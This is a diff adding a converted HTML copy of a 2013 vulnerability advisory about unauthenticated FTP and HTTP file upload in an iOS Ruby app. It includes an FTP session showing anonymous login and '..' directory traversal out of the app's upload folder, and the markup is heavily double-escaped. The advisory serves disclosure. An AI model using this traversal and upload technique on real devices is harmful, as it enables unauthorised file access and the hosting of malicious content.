@@ -1,0 +1,61 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title></title>
+<meta name="generator" content="HTML::TextToHTML v2.51"/>
+</head>
+<body>
+<p>&lt;html&gt;&lt;title&gt;Vulnerability&lt;/title&gt;&lt;head&gt; &lt;style type="text/css"&gt;&lt;!-- A {text-decoration:none} --&gt;div {
+</p><p>    white-space: pre-wrap;      /* CSS3 <em>/
+    white-space: -moz-pre-wrap; /</em> Firefox <em>/
+    white-space: -pre-wrap;     /</em> Opera &lt;7 <em>/
+    white-space: -o-pre-wrap;   /</em> Opera 7 */
+    word-wrap: break-word;<br/>
+}&lt;/style&gt;&lt;/head&gt;&lt;body alink="<strong>EE0000" link="</strong>0000EE" bgcolor="#333333" text="#000000" vlink="#551A8B"&gt;&lt;center&gt;&lt;table border="0" cellpadding="2" cellspacing="2" width="70%"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style="background-color:rgb(150,200,200);font-weight: bold;"&gt;&lt;center&gt;Advisory #: 97&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Title:&lt;/b&gt; Unauthenticated Remote File Upload via HTTP for ruby-Programming language 1.7 on iOS&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Author: &lt;/b&gt;Larry W. Cashdollar, @_larry0&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Date:&lt;/b&gt; 2013-08-01&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Download Site:&lt;/b&gt; &lt;a href="<a href="https://itunes.apple.com/us/app/ruby-programming-language/id581732143?mt=8&amp;ls=1">https://itunes.apple.com/us/app/ruby-programming-language/id581732143?mt=8&amp;ls=1</a> <a href="http://www.tayutec.com/indexen.html">http://www.tayutec.com/indexen.html</a>"&gt;<a href="https://itunes.apple.com/us/app/ruby-programming-language/id581732143?mt=8&amp;ls=1">https://itunes.apple.com/us/app/ruby-programming-language/id581732143?mt=8&amp;ls=1</a> <a href="http://www.tayutec.com/indexen.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">http://www.tayutec.com/indexen.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor: &lt;/b&gt;Tayutec&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Notified: &lt;/b&gt; 2013-08-01&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vendor Contact:&lt;/b&gt; <a href="https://twitter.com/tayutec&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td">https://twitter.com/tayutec&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td</a> valign="top" style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Description:&lt;/b&gt; &lt;span style="color: rgb(0, 0, 0); font-family: Times; font-size: medium; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: auto; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none;"&gt;This is an ios ruby app,you can learn,run,share ruby script. Features : 
+Autocomplate.<br/>
+Auto Indent.<br/>
+Code color.<br/>
+In(the built-in browser or the txt editor),Select the text to run.
+Horizontal screen development.
+</p><p>Code templates, the contents of the new file is copy from contents of the template file.
+</p><p>You can enter ruby code by keyboard or two-dimensional code, and then you can execut the ruby code,support the gets function.
+You can adjust the code color and font size, and support to move the cursor left and right and up and down , easy to read and write.
+You can upload learning materials to the local on the computer via wifi, support http and ftp two upload ways. The file system supports txt, pdf, chm, mp3,m4v,zip, gif, png, html, rb, doc ...
+You can find learning materials by the built-in browser.
+You can save ruby code and learning materials, and can be modified to the save file and delete the save file .
+You can control the background image and color, and execution voice, background animation, text color and shadow, switch interface animation, the number and the order of the main interface of the tab bar to create your learning software.
+You can Learn ruby knowledge, the system provides some basic learning materials.
+You can use ruby code or learning materials to generate two-dimensional code , for easy sharing .
+You can share code by Email,Weibo,Twitter,Facebook.
+You can use the counter,light in the Setting tab.&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Vulnerability:&lt;/b&gt;&lt;div&gt;&amp;#039;iOSftp&amp;#039; &amp;amp; http unauthenticated file uplolads. The application is sandboxed, but any remote user can read/write to the devices storage.
+The uploaded content is served out of the http servers directory. While the http server doesn&amp;#039;t process server side scripts it is possible to upload and serve malicious / illegal content. 
+I would think it&amp;#039;s also possible to fill up the devices storage as well but did not test it.
+larry$ ftp <a href="telnet://192.168.0.31:1000">192.168.0.31 1000</a>0<br/>
+Connected to <a href="telnet://192.168.0.31">192.168.0.31</a>.<br/>
+220 iosFtp server ready.<br/>
+Name (<a href="ftp://192.168.0.31/larry">192.168.0.31:larry</a>): anyone<br/>
+331 Password required for anyone<br/>
+Password: <br/>
+230 User anyone logged in.<br/>
+Remote system type is UNIX.<br/>
+Using binary mode to transfer files.<br/>
+ftp&amp;gt; pwd<br/>
+Remote directory: /private/var/mobile/Applications/0F96EC13-FD37-4A0D-A054-6A4A93F8DC5A/Documents/ftp *
+ftp&amp;gt; cd ../../../../<br/>
+250 CWD command successful.<br/>
+ftp&amp;gt; pwd<br/>
+Remote directory: /private/var/mobile<br/>
+ftp&amp;gt; cd /<br/>
+250 CWD command successful.<br/>
+ftp&amp;gt; pwd<br/>
+Remote directory: /<br/>
+ftp&amp;gt; <br/>
+* You also get path disclosure.<br/>
+HTTP server listening on port 8080 allows arbitrary file writes to storage.
+</p><p>You can create directories out side the upload path through the file upload web interface and the .. bug. Because the application is sandbox I was unable to overwtite application executables and components so impact is limited. As stated above you can serve malicious content (javascript/html) via http. &lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;CVE-&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;JSON:&lt;/b&gt;&lt;a href="json.php?s=97"&gt; Export&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Exploit Code:&lt;/b&gt;&lt;div&gt;&lt;pre class="php" style="font-family:monospace;"&gt;&lt;ol&gt;&lt;li style="font-weight: normal; vertical-align:top;"&gt;&lt;div style="font: normal normal 1em/1.2em monospace; margin:0; padding:0; background:none; vertical-align:top;"&gt;&amp;nbsp;&lt;/div&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Screen Shots:&lt;/b&gt; [&lt;a href="/m/webint.gif"&gt;webint.gif&lt;/a&gt;]&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="background-color: rgb(220,220,220);"&gt;&lt;b&gt;Advisory:&lt;/b&gt; &lt;a href="<a href="http://www.vapid.dhs.org/advisories/ruby-ios-Huang-XiaoWen.html">http://www.vapid.dhs.org/advisories/ruby-ios-Huang-XiaoWen.html</a>"&gt;<a href="http://www.vapid.dhs.org/advisories/ruby-ios-Huang-XiaoWen.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt">http://www.vapid.dhs.org/advisories/ruby-ios-Huang-XiaoWen.html&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/center&gt;&lt;/body&gt</a>;
+&lt;/html&gt;
+</p>
+
+</body>
+</html>
